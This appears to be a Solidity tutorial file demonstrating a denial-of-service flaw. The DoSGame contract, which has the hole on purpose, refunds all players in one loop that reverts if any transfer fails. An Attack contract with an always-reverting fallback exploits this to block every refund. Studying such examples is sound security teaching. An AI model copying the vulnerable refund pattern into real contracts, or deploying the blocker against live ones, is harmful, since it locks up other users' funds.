// SPDX-License-Identifier: MIT
// english translation by 22X
pragma solidity ^0.8.21;

// Game with DoS vulnerability, players deposit money and call refund to withdraw it after the game ends.
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;
    
    // All players deposit ETH into the contract
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // Record the deposit
        balanceOf[msg.sender] = msg.value;
        // Record the player's address
        players.push(msg.sender);
    }

    // Game ends, refund starts, all players receive refunds one by one
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // Loop through all players to refund them
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}

contract Attack {
    // DoS attack during refund
    fallback() external payable{
        revert("DoS Attack!");
    }

    // Participate in the DoS game and deposit
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}